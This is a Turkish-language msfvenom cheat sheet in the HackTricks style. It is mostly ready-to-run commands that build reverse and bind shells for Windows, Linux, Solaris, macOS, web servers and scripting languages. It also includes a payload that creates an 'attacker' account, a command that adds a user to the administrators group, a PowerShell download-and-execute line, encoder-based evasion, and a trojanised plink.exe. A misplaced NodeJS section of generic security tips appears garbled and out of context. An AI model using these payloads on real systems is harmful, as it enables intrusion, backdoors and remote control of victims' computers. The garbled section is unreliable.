# MSFVenom - Hile Sayfası

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve ödül avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hacking İçgörüleri**\
Hacking'in heyecanına ve zorluklarına dalmış içeriklerle etkileşim kurun

**Gerçek Zamanlı Hack Haberleri**\
Hızlı tempolu hacking dünyasını gerçek zamanlı haberler ve içgörülerle takip edin

**En Son Duyurular**\
Yeni ödül avcılarının başlattığı ve önemli platform güncellemeleriyle ilgili bilgileri takip edin

**Bize katılın** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugün en iyi hackerlarla işbirliği yapmaya başlayın!

***

## Temel msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE SAYISI> LHOST=<IP>`

Ayrıca `-a` kullanarak mimariyi veya `--platform`'u belirlemek de mümkündür

## Listeleme
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## Kabuk kodu oluştururken yaygın parametreler

Bir kabuk kodu oluştururken aşağıdaki yaygın parametreleri kullanabilirsiniz:

- **`-p`** veya **`--payload`**: Kullanılacak kabuk kodu türünü belirtir. Örneğin, `windows/meterpreter/reverse_tcp` veya `linux/x86/shell_reverse_tcp`.

- **`-f`** veya **`--format`**: Kabuk kodunun çıktı formatını belirtir. Örneğin, `exe`, `elf`, `raw`, `c`, `asp`, `jsp`, vb.

- **`-e`** veya **`--encoder`**: Kabuk kodunu şifrelemek için kullanılacak bir şifreleyici belirtir. Örneğin, `x86/shikata_ga_nai`, `x86/jmp_call_additive`, vb.

- **`-i`** veya **`--iterations`**: Şifreleyici için kullanılacak iterasyon sayısını belirtir. Varsayılan değer 1'dir.

- **`-b`** veya **`--bad-chars`**: Kabuk kodunda bulunmasını istemediğiniz karakterleri belirtir. Örneğin, `\x00\x0a\x0d`.

- **`-a`** veya **`--arch`**: Hedef mimariyi belirtir. Örneğin, `x86`, `x64`, `armle`, `aarch64`, vb.

- **`-s`** veya **`--space`**: Kabuk kodunun boyutunu belirtir. Örneğin, `1000`, `2000`, vb.

- **`-o`** veya **`--out`**: Çıktı dosyasının adını belirtir. Örneğin, `shellcode.exe`, `payload.bin`, vb.

- **`-v`** veya **`--var-name`**: Kabuk kodunu içeren değişkenin adını belirtir. Örneğin, `shellcode`, `payload`, vb.

- **`-x`** veya **`--template`**: Kabuk kodunu içeren bir şablon dosyasını belirtir. Örneğin, `template.txt`.

- **`-k`** veya **`--keep`**: Geçici dosyaları silmek yerine saklamak için kullanılır.

- **`-h`** veya **`--help`**: Yardım mesajını görüntüler ve çıkış yapar.

Örnek kullanım:

```plaintext
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f exe -o shellcode.exe
```

Bu komut, `windows/meterpreter/reverse_tcp` kabuk kodunu kullanarak `192.168.0.100` IP adresine ve `4444` portuna ters TCP bağlantısı sağlayan bir `exe` dosyası olan `shellcode.exe`'yi oluşturur.
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
## **Windows**

### **Ters Kabuk**

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bağlama Kabuğu

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### Kullanıcı Oluşturma

{% code overflow="wrap" %}
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Kabuğu

{% code overflow="wrap" %}
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Komut Çalıştırma**

{% code overflow="wrap" %}
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
{% endcode %}

### Kodlayıcı

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
{% endcode %}

### Yürütülebilir içine gömülü

{% code overflow="wrap" %}
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
{% endcode %}

## Linux Payloadları

### Ters Kabuk

{% code overflow="wrap" %}
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bağlama Kabuğu

{% code overflow="wrap" %}
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
{% endcode %}

### SunOS (Solaris)

{% code overflow="wrap" %}
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
{% endcode %}

## **MAC Payloadları**

### **Ters Kabuk:**

{% code overflow="wrap" %}
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Bind Shell**

{% code overflow="wrap" %}
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
{% endcode %}

## **Web Tabanlı Payloadlar**

### **PHP**

#### Ters kabuk

{% code overflow="wrap" %}
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
{% endcode %}

### ASP/x

#### Ters kabuk

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
{% endcode %}

### JSP

#### Ters kabuk

{% code overflow="wrap" %}
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
{% endcode %}

### WAR

#### Ters Kabuk

{% code overflow="wrap" %}
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
{% code %}

### NodeJS

NodeJS, Google Chrome'un V8 JavaScript motorunu kullanan bir çalışma zamanı ortamıdır. Bu, sunucu tarafı uygulamaları geliştirmek için kullanılan bir platformdur. NodeJS, JavaScript'i kullanarak hızlı ve ölçeklenebilir ağ uygulamaları oluşturmayı sağlar.

NodeJS, çeşitli güvenlik açıklarına sahip olabilir. Bu nedenle, NodeJS uygulamalarını güvence altına almak için bazı önlemler almak önemlidir. Aşağıda, NodeJS uygulamalarını güvence altına almak için bazı yaygın güvenlik önlemleri bulunmaktadır:

1. Güvenli Bağımlılıklar: NodeJS projelerinde kullanılan bağımlılıkların güvenli ve güncel olduğundan emin olunmalıdır. Güvenlik açıkları olan veya güncellenmeyen bağımlılıklar, saldırganların sisteme erişmesine neden olabilir. Bağımlılıkları düzenli olarak kontrol etmek ve güncellemek önemlidir.

2. Güçlü Parolalar: NodeJS uygulamalarında kullanılan parolaların güçlü ve karmaşık olması önemlidir. Basit veya tahmin edilebilir parolalar, saldırganların hesaplara erişmesini kolaylaştırabilir. Parolaların karmaşık olması ve düzenli olarak değiştirilmesi önemlidir.

3. Veri Doğrulama: NodeJS uygulamalarında kullanıcı girişlerinin doğrulanması önemlidir. Kötü niyetli kullanıcılar, hatalı veya zararlı veriler göndererek sisteme erişebilirler. Giriş verilerinin doğrulanması ve filtrelenmesi, güvenlik açıklarını azaltmaya yardımcı olur.

4. Güvenli Oturum Yönetimi: NodeJS uygulamalarında oturum yönetimi güvenliği önemlidir. Oturum kimlik bilgilerinin güvenli bir şekilde saklanması ve iletilmesi gerekmektedir. Oturum kimlik bilgilerinin çalınması, saldırganların hesaplara erişmesine neden olabilir. Oturum yönetimi için güvenli ve güncel yöntemler kullanılmalıdır.

5. Güvenlik İzleme: NodeJS uygulamalarının güvenlik durumunu izlemek önemlidir. Sistem günlüklerinin düzenli olarak kontrol edilmesi ve güvenlik açıklarının tespit edilmesi gerekmektedir. Güvenlik açıkları hızlı bir şekilde tespit edilip düzeltilmelidir.

NodeJS uygulamalarını güvence altına almak için bu önlemleri uygulamak önemlidir. Bu önlemler, saldırılara karşı koruma sağlamaya yardımcı olur ve uygulamanın güvenliğini artırır.

{% endcode %}
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Komut Dili yükleri**

### **Perl**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
{% endcode %}

### **Python**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve ödül avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hacking İçgörüleri**\
Hacking'in heyecanına ve zorluklarına dalmış içeriklerle etkileşim kurun

**Gerçek Zamanlı Hack Haberleri**\
Gerçek zamanlı haberler ve içgörüler aracılığıyla hızlı tempolu hacking dünyasında güncel kalın

**En Son Duyurular**\
Yeni ödül avcıları başlatmaları ve önemli platform güncellemeleri hakkında bilgilendirin

**Bize katılın** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugün en iyi hackerlarla işbirliği yapmaya başlayın!

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi **HackTricks'te reklam vermek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da** takip edin.
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>
